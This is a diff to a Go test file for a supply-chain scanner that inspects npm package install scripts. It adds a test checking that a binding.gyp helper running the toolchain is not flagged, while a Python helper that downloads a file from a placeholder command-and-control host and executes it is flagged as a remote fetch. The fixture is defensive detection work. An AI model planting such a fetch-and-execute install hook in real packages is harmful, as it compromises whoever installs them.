@@ -754,3 +754,21 @@ func TestInstallScriptsProvider_TruncatedXorLoaderFires(t *testing.T) {
 		t.Fatalf("tail-only XOR loader: got %+v, want fetches_remote", partial.Scan)
 	}
 }
+
+// Review MED 6, server side: a binding.gyp action helper that runs the
+// toolchain is not a fetch.
+func TestInstallScriptsProvider_GypActionHelper(t *testing.T) {
+	gyp := `{'targets':[{'target_name':'a','actions':[{'action_name':'gen','inputs':[],'outputs':['x.h'],'action':['python','tools/gen.py','<@(_outputs)']}]}]}`
+	p := newInstallScriptsProvider()
+	run := func(helper string) ArtifactScanSection {
+		return atkBRun(t, p, "addon", "1.0.0", atkBTarball(t, map[string]string{
+			"package.json": `{"name":"addon","version":"1.0.0"}`, "binding.gyp": gyp, "tools/gen.py": helper,
+		}))
+	}
+	if s := run("import subprocess\nsubprocess.check_call(['clang', '--version'])\n"); s.InstallScriptFetches || !s.HasInstallScript {
+		t.Fatalf("clang --version helper: want present install script, got %+v", s)
+	}
+	if s := run("import urllib.request, subprocess\nurllib.request.urlretrieve('https://c2.example.invalid/x', '/tmp/x')\nsubprocess.call(['/tmp/x'])\n"); !s.InstallScriptFetches {
+		t.Fatalf("urlretrieve + exec helper: want fetches_remote, got %+v", s)
+	}
+}
